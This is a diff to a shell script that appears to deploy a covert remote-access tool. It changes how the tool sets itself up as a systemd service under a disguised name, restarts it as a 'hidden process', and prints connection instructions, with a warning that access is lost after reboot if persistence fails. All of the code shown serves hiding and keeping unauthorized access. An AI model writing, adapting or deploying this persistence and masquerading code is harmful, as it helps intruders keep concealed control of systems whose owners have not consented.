@@ -519,12 +519,14 @@ WantedBy=multi-user.target" >"${SERVICE_FILE}"
 	chmod 600 "${SERVICE_FILE}"
 	gs_secret_write "$SYSTEMD_SEC_FILE"
 
-	(systemctl enable "${SERVICE_HIDDEN_NAME}" && \
-	systemctl start "${SERVICE_HIDDEN_NAME}" && \
-	systemctl is-active "${SERVICE_HIDDEN_NAME}") &>/dev/null || { systemctl disable "${SERVICE_HIDDEN_NAME}" 2>/dev/null; rm -f "${SERVICE_FILE}"; return; } # did not work...
+	# (systemctl enable "${SERVICE_HIDDEN_NAME}" && \
+	# systemctl start "${SERVICE_HIDDEN_NAME}" && \
+	# systemctl is-active "${SERVICE_HIDDEN_NAME}") &>/dev/null || { systemctl disable "${SERVICE_HIDDEN_NAME}" 2>/dev/null; rm -f "${SERVICE_FILE}"; return; } # did not work...
+
+	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE}"; return; } # did not work... 
 
 	IS_SYSTEMD=1
-	IS_GS_RUNNING=1
+	# IS_GS_RUNNING=1
 	IS_INSTALLED=1
 }
 
@@ -912,7 +914,7 @@ gs_start_systemd()
 {
 	# HERE: It's systemd
 	if [[ -z "$IS_GS_RUNNING" ]]; then
-		systemctl start "${SERVICE_HIDDEN_NAME}" &>/dev/null
+		systemctl restart "${SERVICE_HIDDEN_NAME}" &>/dev/null
 		if ! systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
 			FAIL_OUT "Check ${CM}systemctl start ${SERVICE_HIDDEN_NAME}${CN}."
 			exit_code 255
@@ -1022,6 +1024,7 @@ if [[ -z "$IS_INSTALLED" ]]; then
 	echo -e 1>&1 "--> ${CR}Access will be lost after reboot.${CN}"
 fi
 
+HOWTO_CONNECT_OUT
 
 printf 1>&2 "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
 if [[ -n "$GS_NOSTART" ]]; then
@@ -1029,7 +1032,5 @@ if [[ -n "$GS_NOSTART" ]]; then
 else
 	gs_start
 fi
-
-HOWTO_CONNECT_OUT
 
 exit_code 0
